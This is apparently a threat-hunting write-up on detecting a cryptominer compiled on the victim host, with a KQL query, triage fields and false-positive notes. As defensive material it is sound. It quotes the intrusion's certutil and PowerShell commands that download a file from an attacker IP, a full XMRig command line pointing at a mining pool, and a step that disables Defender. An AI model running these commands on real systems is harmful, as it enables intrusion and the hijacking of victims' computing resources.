false_positive_notes: |
  Compilation on an endpoint is entirely normal on the endpoints that exist to compile things, so population scoping does most of the work here: run this against hosts with no development role — servers, kiosks, digital-signage and appliance hosts, finance and HR laptops — and exclude developer workstations and build agents wholesale rather than trying to enumerate their legitimate patterns. Within a non-developer population, the recurring benign sources are specific and allowlistable. csc.exe is invoked legitimately by MSBuild.exe, devenv.exe, dotnet.exe, ServiceModelReg and, importantly, by any PowerShell script using Add-Type, which compiles inline C# on the fly and is common in administration tooling and in some management agents; XML serialization in .NET applications also triggers csc.exe transparently under w3wp.exe or a service host. Treat those parents as expected and focus on unsigned parents in %APPDATA%, %PROGRAMDATA%, %TEMP%, C:\Users\*\Documents and C:\Users\*\Downloads. Installers that bundle a compiler (some Python, R, Perl and CUDA toolchains, node-gyp native module builds) will legitimately run gcc.exe or cc1.exe during setup, so require the multi-toolchain condition — a burst mixing .NET and native C compilers from one parent — rather than alerting on any single compiler execution, and confirm against change and patch windows. The corroborating legs carry far less noise than the compile burst itself: explorer.exe carrying XMRig arguments has no legitimate form at all, and Defender real-time monitoring being disabled on a host that is not mid-maintenance should already be a ticket.

  The compile burst (primary signal) - Core filter: group process-creation events by host and parent process over a five to fifteen minute window, and flag parents that spawn two or more DISTINCT images from the compiler and linker set: csc.exe, vbc.exe, cvtres.exe, cl.exe, link.exe, tcc.exe, gcc.exe, g++.exe, cc1.exe, cc1plus.exe, collect2.exe, as.exe, ld.exe, windres.exe, ilasm.exe, plus shellcode converters such as donut.exe. Triage fields: ParentImage, ParentCommandLine, signature status of the parent, Image, CommandLine, User, IntegrityLevel. Strong red flags: the parent is unsigned and sits in C:\Users\*\Documents, \Downloads\, %APPDATA%, %PROGRAMDATA% or C:\Windows\Temp; the parent's own name advertises its purpose (the source report's sample was literally named Silent XMR Miner Builder.exe); the host has no MSBuild, Visual Studio or SDK installation to justify a toolchain at all.
  Compiler output artefacts - Core filter: Sysmon Event ID 11 writes of .exe, .dll, .obj, .res, .tmp and .cmdline files into %TEMP% or the parent's own directory within the same window, which is how csc.exe and cvtres.exe stage intermediates. A newly written PE whose hash has never been seen in the environment, created by a compiler child of an unsigned parent, is the artefact to hand to the responder.
  Defender XDR advanced hunting - Detect the multi-toolchain burst directly:
  DeviceProcessEvents
  | where Timestamp > ago(30d)
  | where FileName in~ ("csc.exe","vbc.exe","cvtres.exe","cl.exe","link.exe","tcc.exe","gcc.exe","g++.exe","cc1.exe","cc1plus.exe","collect2.exe","as.exe","ld.exe","ilasm.exe","donut.exe")
  | where InitiatingProcessFileName !in~ ("msbuild.exe","devenv.exe","dotnet.exe","powershell.exe","pwsh.exe","w3wp.exe","node.exe","python.exe")
  | summarize Toolchains = dcount(FileName), Which = make_set(FileName, 16), Cmds = make_set(ProcessCommandLine, 8)
      by DeviceId, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessSHA256, bin(Timestamp, 15m)
  | where Toolchains >= 2
  | order by Toolchains desc
  Remove powershell.exe from the exclusion list if you want Add-Type activity included; leave it out for a lower-noise first pass.
  Injected miner execution (corroboration with near-zero false positives) - Core filter: process command lines for explorer.exe, or any signed Windows binary, containing XMRig arguments — --algo, --randomx-mode, --cpu-max-threads-hint, --cinit-find-x, --url= or --pass=. The source report's payload ran as C:\Windows\explorer.exe --cinit-find-x -B --algo="rx/0" --asm=auto --randomx-mode=auto --url=auto.c3pool.org:19999 --cpu-max-threads-hint=100. Legitimate explorer.exe accepts none of these switches, so any hit is actionable on its own. Pair with Sysmon Event ID 3 or proxy egress to mining pools and non-standard ports (c3pool.org, pool.supportxmr.com, nanopool, ports 3333, 4444, 5555, 14444, 19999) and with sustained high CPU on the host.
  Defender impairment leg - Core filter: Windows Defender operational log entries for real-time monitoring disabled, plus registry writes to DisableAntiSpyware or DisableRealtimeMonitoring, plus exclusion additions. The source report's actor disabled Defender through SystemSettingsAdminFlows.exe, which is a signed Windows binary and therefore worth naming explicitly in the hunt: SystemSettingsAdminFlows.exe with a Defender-related argument on a host that is not in a maintenance window is the kind of event that is trivially explainable individually and damning in sequence.
  Chain context for scoping and pivots - In the source intrusion the compile burst was downstream of a public-facing application exploit: the web application process tomcat9.exe (Samsung MagicINFO, CVE-2025-4632) was the parent for repeated ingress-tool-transfer attempts using certutil -urlcache -split -f and powershell -c Invoke-WebRequest against http://194.87.89[.]30:8899/anydesk.exe, followed by RMM install, a local admin account named oldadministrator created for persistence, and only then the miner build. When the compile burst fires, walk the parent chain back to the internet-facing service and forward to Event ID 4720/4732 account creation; the compile step is late in the chain, so a hit means earlier stages are already present and recoverable.

# H337

Huntress documented this intrusion on 24 September 2026, and the detail worth generalising is the inversion it represents: rather than dropping a finished cryptominer and hoping antivirus missed that hash, the actor dropped a *builder* and compiled the miner on the victim host. The payoff is real — a binary compiled locally has a hash nobody has ever seen, can be tuned to the endpoint's CPU, and sidesteps every static signature and reputation check that would have caught a stock XMRig download. The cost is that compilation is not a quiet act. Producing that miner meant invoking the .NET Framework compiler chain (`csc.exe`, `cvtres.exe`) alongside a Tiny C Compiler, a full MinGW-w64 toolchain (`gcc.exe`, `cc1.exe`) and `donut.exe` for shellcode conversion, all as children of one unsigned executable sitting in a user's Documents folder on a digital-signage server. As Huntress put it, the technique is "quite noisy from an EDR telemetry perspective." That noise is the hunt: outside a development workflow, nothing legitimate drives several different compiler toolchains from a single unsigned parent, and the host in question had no business compiling anything at all.

## Why

- Compiling after delivery specifically defeats the controls most organisations lean on hardest — file hash reputation, static signatures and threat-intel matching — because the resulting binary is unique to that host and did not exist anywhere before the intrusion, so the absence of an antivirus hit carries no information here.
- The technique trades stealth in one dimension for extreme loudness in another: the toolchain burst is a dense, short-lived cluster of unusual process creations in ordinary Event ID 4688 and Sysmon Event ID 1 telemetry that nearly every environment already collects, so the cost of hunting it is query time rather than new instrumentation.
- Population scoping makes the signal tractable rather than theoretical: compilers are expected on developer workstations and build agents and nowhere else, so on servers, appliances and general business endpoints the base rate of multi-toolchain compilation is close to zero and a single hit is worth a full triage.
- The corroborating legs are unusually clean for a commodity-crime intrusion — `explorer.exe` carrying `--algo` and `--randomx-mode` arguments has no legitimate form, and the compile step sits late enough in the chain that a hit reliably leads backwards to the exploited public-facing service, the RMM install and the rogue local administrator account that preceded it.
